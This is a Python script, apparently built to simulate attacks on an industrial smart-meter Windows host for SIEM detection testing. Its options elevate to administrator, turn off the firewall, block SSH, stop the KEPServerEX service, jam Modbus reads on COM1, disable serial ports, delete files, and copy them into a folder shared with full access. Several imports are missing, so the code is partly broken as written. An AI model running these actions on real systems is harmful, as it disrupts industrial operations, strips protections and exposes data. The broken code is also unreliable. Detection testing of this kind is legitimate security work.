#import os
from os import walk, path, remove, system, getcwd
#import time
from time import sleep
import threading
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE
from ctypes import windll
from sys import executable

copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory

#Check if administrator
def check_admin():
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

#Delete file in specific folder
def delete_files(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
                remove(og)
        sleep(5)

def copy_file(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
        sleep(5)

    

#Disable firewall
def disable_firewall():
    run('netsh advfirewall set allprofiles state off', shell=True)

#Disable ssh from firewall
def disable_ssh():
    run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
    run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
    run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
    run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')

#Disable Kepserver Service
def disable_kepserver():
    service_name = "KEPServerEXV6"
    run(["sc", "stop", service_name], check=False)

#Run modpoll to interrupt COM1 port
def run_modinterrup():
    current_directory = os.getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2 COM1"]
    try:
        subprocess.check_call([executable_path] + parameters)
    except subprocess.CalledProcessError as e:
        print("Error executing the executable file:", e)

#Disable COM Port
def disable_COMPort():
    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
    dump = cp.stdout.split()
    deviceID = ""
    deviceArr = []
    for i in range(0, len(dump)):
        if dump[i].decode("utf-8") == "ID:":
            deviceID = dump[i+1].decode("utf-8")
            deviceArr.append(deviceID)
            print(str(len(deviceArr)) + " : " + deviceID)
    userInput = input("Choose device to disable, e.g. 1, 2, 3 \n")
    cp = run(["C:\Windows\System32\pnputil.exe", "/disable-device", deviceArr[int(userInput)-1]],stdout=PIPE ,shell=True)
    print(cp.stdout.decode('utf-8'))

#Create Shared Folder
def Create_Share_folder():
    folder_path = r'C:\Windows\temp\Smartmeter'

    # Create the folder if it does not already exist
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)

    # Set the share information
    share_name = 'SmartMeterfolder'
    share_path = folder_path
    share_remark = 'Shared folder for full access'

    # Create the share
    share_info = {
        'netname': share_name,
        'path': share_path,
        'remark': share_remark,
        'max_uses': -1,
        'current_uses': 0,
        'permissions': win32netcon.ACCESS_ALL,
        'security_descriptor': None
    }

    win32net.NetShareAdd(None, 2, share_info)

def revert(revertoption):
    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport
    if revertoption == "1":
        run('netsh advfirewall set allprofiles state on', shell=True)()
    elif revertoption == "2":
        run('netsh advfirewall firewall delete rule name="QRadar Test"')
        run('netsh advfirewall firewall delete rule name="QRadar Test 2"')
        run('netsh advfirewall firewall delete rule name="QRadar Test 3"')
        run('netsh advfirewall firewall delete rule name="QRadar Test 4"')
    elif revertoption == "3":
        service_name = "KEPServerEXV6"
        run(["sc", "start", service_name], check=False)
    elif revertoption == "4":
        print("Help re-enable comport")

if __name__ == '__main__':
    check_admin()
    attackoption = str(argv[1])
    if attackoption == "1":
        delete_files(copiedpath)
    elif attackoption == "2":
        Create_Share_folder()
        copy_file(copiedpath)
    elif attackoption == "3":
        disable_firewall()
    elif attackoption == "4":
        disable_ssh()
    elif attackoption == "5":
        disable_kepserver()
    elif attackoption == "6":
        run_modinterrup()
    elif attackoption == "7":
        disable_COMPort()
    elif attackoption == "8":
        revertoption = str(argv[2])
        revert(revertoption)
    elif attackoption == "-h":
        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to revert with options.")
    else:
        print ("Invalid Option!")
